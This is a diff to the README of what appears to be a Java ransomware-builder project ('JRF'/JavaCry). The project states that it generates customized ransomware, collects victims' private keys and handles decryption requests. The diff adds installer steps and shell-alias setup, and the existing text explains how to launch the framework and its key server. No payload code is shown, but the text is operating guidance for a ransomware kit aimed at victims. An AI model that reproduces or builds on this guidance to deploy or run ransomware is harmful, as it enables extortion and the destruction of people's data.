@@ -10,6 +10,15 @@
 It is a project to build the java ransomwares generator and manage ransomware victims. It generates customized ransomwares, listens for victim's private key, and handles decryption requests. 
 
 ## User guideline
+
+**Using an installer**
+
+* MacOS and Linux
+    * Download and run the `JRFInstaller.sh` bash script, which would install the source in the /opt/JavaCry directory, and make aliases in bash and zsh.
+    * To run the JRF framework, refresh the terminal and run `JRF [commands]`.
+
+**Manually download and run the source**
+
 * To run the JRF framework, move to JRF/Classes directory and run `java JRF [commands]` in terminal
 * To run MainServer, which handles keys and decryption requests, move to JRF/Classes directory and run `java MainServer` or `java JRF -s` in terminal
 
